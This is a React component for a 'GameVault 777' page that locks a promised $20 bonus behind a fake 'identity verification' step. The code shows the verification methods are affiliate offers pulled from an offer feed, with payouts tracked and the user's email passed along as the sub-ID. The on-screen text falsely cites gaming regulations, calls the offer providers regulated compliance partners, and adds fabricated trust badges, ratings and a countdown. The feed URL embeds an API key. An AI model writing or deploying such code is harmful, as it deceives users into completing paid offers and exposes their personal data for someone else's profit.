"use client";

import { useEffect, useState, useRef } from "react";

// ⑥ LOCKER
export function LockerScreen({ isActive, onNext, userData }) {
  const [lockSecs, setLockSecs] = useState(14 * 60 + 59);
  const [offers, setOffers] = useState([]);
  const [loadingOffers, setLoadingOffers] = useState(true);
  const [errorOffers, setErrorOffers] = useState(false);

  const [activeIdx, setActiveIdx] = useState(null);
  const [verified, setVerified] = useState(false);
  const [showBlock, setShowBlock] = useState(false);
  const [showPending, setShowPending] = useState(false);

  const [elapsed, setElapsed] = useState(0);
  const pollTimerRef = useRef(null);
  const elTimerRef = useRef(null);

  // Constants
  const CFG = {
    feedUrl:
      "https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id=378788&api_key=01e1f87ac8720a6f0d3e8b0f1eedcf4c&s1=__UID__&s2=signup_us_uk_hicpm&callback=?",
    numOffers: 2,
    pollMs: 5000,
    pollMaxMs: 180000,
  };

  const ICONS = [
    <i className="ph-fill ph-bank"></i>,
    <i className="ph-fill ph-clipboard-text"></i>,
  ];
  const DESCS = [
    "Quick identity check via trusted compliance partner",
    "Secure account confirmation via regulated partner",
  ];
  const RATINGS = ["94%", "88%"];

  // Name and Email Display
  const fullName = userData?.fname
    ? `${userData.fname} ${userData.lname}`
    : "New Player";
  const displayEmail = userData?.email
    ? userData.email.split("@")[0][0] +
    (userData.email.split("@")[0].length > 2 ? "***" : "") +
    "@" +
    userData.email.split("@")[1]
    : "••••@email.com";

  useEffect(() => {
    if (!isActive) return;

    // Timer
    const iv = setInterval(() => {
      setLockSecs((prev) => {
        if (prev <= 0) {
          clearInterval(iv);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Fetch offers
    fetchMethods();

    return () => clearInterval(iv);
  }, [isActive]);

  const fetchMethods = () => {
    setLoadingOffers(true);
    setErrorOffers(false);

    const url = CFG.feedUrl
      .replace("callback=?", "callback=gv7feed")
      .replace("__UID__", encodeURIComponent(userData?.email || "test"));

    const tag = document.createElement("script");
    let done = false;

    const to = setTimeout(() => {
      done = true;
      cleanup();
      setErrorOffers(true);
      setLoadingOffers(false);
    }, 9000);

    window.gv7feed = (data) => {
      if (done) return;
      clearTimeout(to);
      done = true;
      cleanup();
      const topOffers = data.slice(0, CFG.numOffers);
      setOffers(topOffers);
      setLoadingOffers(false);

      // Track impressions
      if (userData?.email) {
        fetch("/api/offers/track", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: userData.email, offers: topOffers }),
        }).catch(e => console.error("Tracking Error:", e));

        fetch("/api/events", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: userData.email,
            action: `Locker Loaded ${CFG.numOffers} Offers`,
            emoji: "📦",
            meta: topOffers.map(o => o.name || o.anchor).join(", ")
          })
        }).catch(e => console.error(e));
      }
    };

    tag.onerror = () => {
      if (done) return;
      clearTimeout(to);
      done = true;
      cleanup();
      setErrorOffers(true);
      setLoadingOffers(false);
    };

    tag.src = url;
    document.head.appendChild(tag);

    function cleanup() {
      if (tag.parentNode) tag.parentNode.removeChild(tag);
      delete window.gv7feed;
    }
  };

  // Visibility Check when returning to tab
  useEffect(() => {
    if (!isActive || activeIdx === null || verified) return;

    const handleVisibility = () => {
      if (!document.hidden && !verified && activeIdx !== null) {
        setTimeout(() => {
          if (!verified) {
            setShowPending(false);
            setShowBlock(true);
          }
        }, 800);
      }
    };

    document.addEventListener("visibilitychange", handleVisibility);
    window.addEventListener("focus", handleVisibility);

    return () => {
      document.removeEventListener("visibilitychange", handleVisibility);
      window.removeEventListener("focus", handleVisibility);
    };
  }, [isActive, activeIdx, verified]);

  const onMethodClick = (idx, offer) => {
    if (verified || activeIdx !== null) return;
    setActiveIdx(idx);
    window.open(offer.url, "_blank", "noopener");
    setShowPending(true);
    startElapsed();
    startPolling();

    if (userData?.email) {
      fetch("/api/events", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: userData.email,
          action: `Clicked Offer: ${offer.anchor || "Method"}`,
          emoji: "🖱️",
          meta: `Payout: $${offer.payout || offer.epc || "0.00"}`
        })
      });
    }
  };

  const startElapsed = () => {
    setElapsed(0);
    elTimerRef.current = setInterval(() => {
      setElapsed((prev) => prev + 1);
    }, 1000);
  };

  const stopElapsed = () => {
    if (elTimerRef.current) clearInterval(elTimerRef.current);
  };

  const startPolling = () => {
    let currentElapsed = 0;
    pollTimerRef.current = setInterval(async () => {
      currentElapsed += CFG.pollMs;
      if (currentElapsed >= CFG.pollMaxMs) {
        if (pollTimerRef.current) clearInterval(pollTimerRef.current);
        onPollTimeout();
        return;
      }
      try {
        const r = await checkStatus();
        if (r.completed) {
          if (pollTimerRef.current) clearInterval(pollTimerRef.current);
          onVerified();
        }
      } catch (e) {
        // keep polling
      }
    }, CFG.pollMs);
  };

  const checkStatus = async () => {
    try {
      const res = await fetch(
        "/api/locker/status?email=" +
        encodeURIComponent(userData?.email || "test"),
      );
      if (!res.ok) throw new Error("poll failed");
      return await res.json();
    } catch (e) {
      return { completed: false };
    }
  };

  const onPollTimeout = () => {
    stopElapsed();
    setShowPending(false);
    setShowBlock(true);
  };

  const onVerified = () => {
    setVerified(true);
    stopElapsed();
    setShowBlock(false);

    // Briefly show the pending success state
    setShowPending(true);
  };

  const doActivate = async () => {
    if (!verified) return;
    onNext();
  };

  const tryOtherOffer = () => {
    if (pollTimerRef.current) clearInterval(pollTimerRef.current);
    stopElapsed();
    setShowBlock(false);
    setShowPending(false);
    setActiveIdx(null);
  };

  const reopenMethod = () => {
    if (activeIdx !== null && offers[activeIdx]) {
      window.open(offers[activeIdx].url, "_blank", "noopener");
      setShowBlock(false);
      setShowPending(true);
    }
  };

  const formatTime = (secs) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m}:${s < 10 ? "0" : ""}${s}`;
  };

  return (
    <div className={`screen ${isActive ? "active" : ""}`} id="screen-locker">
      <div className="topbar">
        <a className="brand" href="#">
          <img src="/logo.png" alt="Game Vault 777" className="brand-logo" />
          <div className="brand-name">GameVault 777</div>
        </a>
      </div>
      <div className="content" style={{ paddingTop: "12px" }}>
        {/* Step nodes */}
        <div className="step-nodes">
          <div className="snode done">
            <div className="snode-circle">
              <i className="ph-bold ph-check"></i>
            </div>
            <span className="snode-lbl">Account</span>
          </div>
          <div className="snode-line done"></div>
          <div className="snode active">
            <div className="snode-circle">2</div>
            <span className="snode-lbl">Verify</span>
          </div>
          <div className="snode-line"></div>
          <div className="snode next">
            <div className="snode-circle">3</div>
            <span className="snode-lbl">Play</span>
          </div>
        </div>

        {/* Hero */}
        <div style={{ textAlign: "center", marginBottom: "4px" }}>
          <div className="lk-chip">
            <i
              className="ph-fill ph-lock-key"
              style={{ fontSize: "12px", marginRight: "2px" }}
            ></i>{" "}
            One-time activation
          </div>
          <h1 className="lk-title">
            Activate your account &<br />
            <span className="accent">claim your welcome bonus</span>
          </h1>
          <div className="bonus-pill">
            <span className="bp-icon">
              <img
                src="dollar.png"
                alt="Dollar"
                style={{ width: "28px", height: "28px", objectFit: "contain" }}
              />
            </span>
            <div>
              <div className="bp-label">Welcome Bonus</div>
              <div className="bp-val">$20 FREE</div>
            </div>
          </div>
          <p className="lk-sub">
            Complete a quick one-time identity check to activate your account
            and unlock your $20 bonus — required by gaming regulations.
          </p>
        </div>

        {/* Identity card */}
        <div className="id-card">
          <div className="id-top">
            <div className="id-avatar">
              <i className="ph-fill ph-user"></i>
            </div>
            <div className="id-info">
              <div className="id-name" id="idName">
                {fullName}
              </div>
              <div className="id-email" id="idEmail">
                {displayEmail}
              </div>
            </div>
            <div className={`id-badge ${verified ? "verified" : ""}`}>
              {verified ? (
                <i
                  className="ph-bold ph-check"
                  style={{ marginRight: "2px" }}
                ></i>
              ) : (
                <i
                  className="ph-bold ph-hourglass-high"
                  style={{ marginRight: "2px" }}
                ></i>
              )}
              {verified ? "Verified" : "Pending"}
            </div>
          </div>
          <div className="id-checks">
            <div className="id-check">
              <span>
                <i
                  className="ph-fill ph-envelope-simple"
                  style={{ fontSize: "16px" }}
                ></i>
              </span>
              <span className="id-check-lbl">Email address</span>
              <span className="id-cv cv-ok">
                <i className="ph-bold ph-check"></i> Verified
              </span>
            </div>
            <div className="id-check">
              <span>
                <i
                  className="ph-fill ph-lock-key"
                  style={{ fontSize: "16px" }}
                ></i>
              </span>
              <span className="id-check-lbl">Account security</span>
              <span className="id-cv cv-ok">
                <i className="ph-bold ph-check"></i> Secured
              </span>
            </div>
            <div className="id-check">
              <span>
                <i
                  className="ph-fill ph-identification-card"
                  style={{ fontSize: "16px" }}
                ></i>
              </span>
              <span className="id-check-lbl">Identity confirmation</span>
              <span className={`id-cv ${verified ? "cv-ok" : "cv-pend"}`}>
                {verified ? (
                  <i className="ph-bold ph-check"></i>
                ) : (
                  <i className="ph-bold ph-hourglass-high"></i>
                )}
                {verified ? " Confirmed" : " Required"}
              </span>
            </div>
          </div>
        </div>

        {/* Methods header */}
        <div className="methods-hdr">
          <div className="methods-lbl">Verification methods</div>
          <div className="sess-chip">
            <div className="sess-dot"></div>Session:{" "}
            <b
              style={{
                color: "var(--text)",
                fontVariantNumeric: "tabular-nums",
                marginLeft: "3px",
              }}
            >
              {formatTime(lockSecs)}
            </b>
          </div>
        </div>

        {/* Skeletons & Errors */}
        {loadingOffers && (
          <div className="skel-wrap" id="skelWrap">
            <div className="mskel"></div>
            <div className="mskel"></div>
          </div>
        )}

        {errorOffers && (
          <div
            style={{
              textAlign: "center",
              padding: "20px",
              fontSize: "13px",
              color: "var(--text-sub)",
              border: "1px solid var(--border)",
              borderRadius: "12px",
            }}
          >
            ⚠️ Could not load verification methods.
            <button
              onClick={fetchMethods}
              style={{
                background: "none",
                border: "1px solid var(--border-med)",
                color: "var(--text-sub)",
                padding: "6px 14px",
                borderRadius: "7px",
                cursor: "pointer",
                fontSize: "12px",
                marginLeft: "8px",
                fontFamily: "Inter, sans-serif",
              }}
            >
              Retry
            </button>
          </div>
        )}

        {/* Method List */}
        {!loadingOffers && !errorOffers && (
          <div
            id="methodList"
            style={{
              display: "flex",
              flexDirection: "column",
              width: "100%",
              gap: "10px",
            }}
          >
            {offers.map((offer, i) => {
              let cardClass = "";
              let tagClass = "t-free";
              let tagText = "Free";
              let iconRight = "›";
              let iconLeft = ICONS[i];

              if (activeIdx !== null) {
                if (i === activeIdx) {
                  cardClass = verified ? "s-verified" : "s-active";
                  tagClass = verified ? "t-verified" : "t-active";
                  tagText = verified ? "Verified ✓" : "In Progress";
                  iconRight = verified ? (
                    <i className="ph-bold ph-check"></i>
                  ) : (
                    "↗"
                  );
                  if (verified) iconLeft = <i className="ph-bold ph-check"></i>;
                } else {
                  cardClass = "s-locked";
                  tagClass = "t-locked";
                  tagText = "Locked";
                }
              }

              return (
                <div
                  key={i}
                  className={`mcard ${cardClass}`}
                  onClick={() => onMethodClick(i, offer)}
                >
                  <div className="micon">{iconLeft}</div>
                  <div className="minfo">
                    <div className="mname">
                      {offer.anchor || `Verification Method ${i + 1}`}
                    </div>
                    <div className="mdesc">{DESCS[i]}</div>
                    <div className="cpm-row">
                      <span className="cpm-lbl">Rating</span>
                      <div className="cpm-bar">
                        <div
                          className="cpm-fill"
                          style={{ width: RATINGS[i] }}
                        ></div>
                      </div>
                      <span className="cpm-val">{RATINGS[i]}</span>
                    </div>
                  </div>
                  <div className="mright">
                    <span className={`mtag ${tagClass}`}>{tagText}</span>
                    <div className="marrow">{iconRight}</div>
                  </div>
                </div>
              );
            })}
          </div>
        )}

        {/* BLOCK PANEL */}
        {showBlock && (
          <div
            className="block-panel show"
            id="blockPanel"
            style={{ animation: "shake 0.5s ease" }}
          >
            <div className="block-icon">
              <i className="ph-fill ph-prohibit"></i>
            </div>
            <div className="block-title">
              {activeIdx !== null && elapsed >= CFG.pollMaxMs / 1000
                ? "Verification Timed Out"
                : "Verification Not Completed"}
            </div>
            <p className="block-msg">
              {activeIdx !== null && elapsed >= CFG.pollMaxMs / 1000 ? (
                <>
                  We didn't receive confirmation within the allowed time. Please{" "}
                  <strong>try again</strong> or choose a different verification
                  method.
                </>
              ) : (
                <>
                  You must <strong>fully complete</strong> the verification on
                  the partner page before your $20 bonus can be released.
                  Closing the tab early does not count.
                </>
              )}
            </p>
            <div className="block-steps">
              <div className="block-step">
                <div className="block-step-num">1</div>
                <span>
                  Return to the partner page and complete the full process
                </span>
              </div>
              <div className="block-step">
                <div className="block-step-num">2</div>
                <span>
                  Our system will automatically detect when you're done
                </span>
              </div>
              <div className="block-step">
                <div className="block-step-num">3</div>
                <span>
                  Your $20 bonus unlocks instantly — no extra steps needed
                </span>
              </div>
            </div>
            <button className="reopen-offer-btn" onClick={reopenMethod}>
              <i className="ph-bold ph-arrow-up-right"></i> &nbsp;Return to
              Verification Page
            </button>
            <div className="block-or">— or —</div>
            <button className="try-other-btn" onClick={tryOtherOffer}>
              Try a Different Verification Method
            </button>
          </div>
        )}

        {/* PENDING PANEL */}
        {showPending && (
          <div className="pend-panel show" id="pendPanel">
            {!verified ? (
              <>
                <div className="pspin">
                  <div className="ps1"></div>
                  <div className="ps2"></div>
                  <div className="ps3"></div>
                  <div className="ps-em">
                    <i
                      className="ph-bold ph-magnifying-glass"
                      style={{ fontSize: "24px" }}
                    ></i>
                  </div>
                </div>
                <div className="pend-title">Processing Verification...</div>
                <p className="pend-sub">
                  Complete the process on the partner page. We check every few
                  seconds — no action needed here.
                </p>
                <div className="pdots">
                  <div className="pdot"></div>
                  <div className="pdot"></div>
                  <div className="pdot"></div>
                </div>
                <div className="pchecks">
                  <div className="pck done">
                    <div className="pck-dot"></div>Account created
                  </div>
                  <div className="pck done">
                    <div className="pck-dot"></div>Email verified
                  </div>
                  <div className={`pck`}>
                    <div className="pck-dot"></div>Identity confirmed
                  </div>
                </div>
                <div className="el-track">
                  <div
                    className="el-fill"
                    style={{
                      width: `${Math.min((elapsed / (CFG.pollMaxMs / 1000)) * 100, 100)}%`,
                    }}
                  ></div>
                </div>
                <div className="el-txt">
                  Checking — <b>{elapsed}s</b> elapsed
                </div>
              </>
            ) : (
              <>
                <div className="pend-title">
                  <i
                    className="ph-bold ph-check-circle"
                    style={{ color: "var(--green)", marginRight: "4px" }}
                  ></i>
                  Identity Confirmed!
                </div>
                <p className="pend-sub">
                  Your identity has been verified. Tap the button below to claim
                  your bonus!
                </p>
                <div
                  className="pchecks"
                  style={{ marginTop: "16px", marginBottom: "0" }}
                >
                  <div className="pck done" style={{ marginBottom: "8px" }}>
                    <div className="pck-dot"></div>Account created
                  </div>
                  <div className="pck done" style={{ marginBottom: "8px" }}>
                    <div className="pck-dot"></div>Email verified
                  </div>
                  <div className={`pck done`} style={{ marginBottom: "0" }}>
                    <div
                      className="pck-dot"
                      style={{ background: "var(--green)" }}
                    ></div>
                    Identity confirmed
                  </div>
                </div>
              </>
            )}
          </div>
        )}

        {/* Activate button */}
        <div className="act-btn-wrap">
          <button
            className={`act-btn ${verified ? "ready" : ""}`}
            style={{
              display:
                showBlock || (showPending && !verified) ? "none" : "block",
            }}
            disabled={!verified}
            onClick={doActivate}
          >
            {verified ? (
              <>
                <i
                  className="ph-bold ph-check"
                  style={{ marginRight: "4px" }}
                ></i>
                Claim $20 Bonus & Activate Account
              </>
            ) : (
              <>
                <i
                  className="ph-fill ph-lock-key"
                  style={{ marginRight: "4px" }}
                ></i>
                &nbsp;Waiting for verification
              </>
            )}
          </button>
          <p
            className={`act-hint ${verified ? "ok" : ""}`}
            style={{
              display:
                showBlock || (showPending && !verified) ? "none" : "block",
            }}
          >
            {verified
              ? "Identity confirmed — tap to enter Game Vault 777!"
              : "Activates automatically once your identity is confirmed"}
          </p>
        </div>

        {/* Trust */}
        <div className="trust-row">
          <div className="tbadge">
            <i
              className="ph-fill ph-lock-key"
              style={{ fontSize: "12px", color: "var(--text-sub)" }}
            ></i>{" "}
            SSL Secured
          </div>
          <div className="tbadge">
            <i
              className="ph-fill ph-shield-check"
              style={{ fontSize: "12px", color: "var(--text-sub)" }}
            ></i>
            256-bit Encrypted
          </div>
          <div className="tbadge">
            <i
              className="ph-fill ph-check-circle"
              style={{ fontSize: "12px", color: "var(--green)" }}
            ></i>{" "}
            Privacy Protected
          </div>
        </div>

        {/* FAQ - Using native details/summary for simpler react logic */}
        <div className="faq-wrap">
          <details style={{ width: "100%" }}>
            <summary
              className="faq-btn"
              style={{ listStyle: "none", outline: "none" }}
            >
              Why is this required? <span className="faq-arr">▾</span>
            </summary>
            <div
              className="faq-body open"
              style={{ display: "block", marginTop: "12px" }}
            >
              <div className="faq-qi">
                <div className="faqq">
                  Why must I complete the full verification?
                </div>
                <div className="faqa">
                  Gaming regulations require confirmed identity before releasing
                  bonuses. Simply clicking an offer and closing the tab does not
                  satisfy this requirement — the partner must confirm you
                  completed their process.
                </div>
              </div>
              <div className="faq-qi">
                <div className="faqq">How does automatic detection work?</div>
                <div className="faqa">
                  Our verification partners send us a secure confirmation the
                  moment you finish. Your bonus unlocks automatically — you
                  don't need to do anything on this page.
                </div>
              </div>
              <div className="faq-qi">
                <div className="faqq">Is my data safe?</div>
                <div className="faqa">
                  All verification is processed by regulated compliance partners
                  using 256-bit encryption. We never store identity documents.
                </div>
              </div>
              <div className="faq-qi">
                <div className="faqq">Do I need to do this again?</div>
                <div className="faqa">
                  No — this is a permanent one-time step. After verification you
                  have full access to Game Vault 777 forever.
                </div>
              </div>
            </div>
          </details>
        </div>
      </div>
    </div>
  );
}
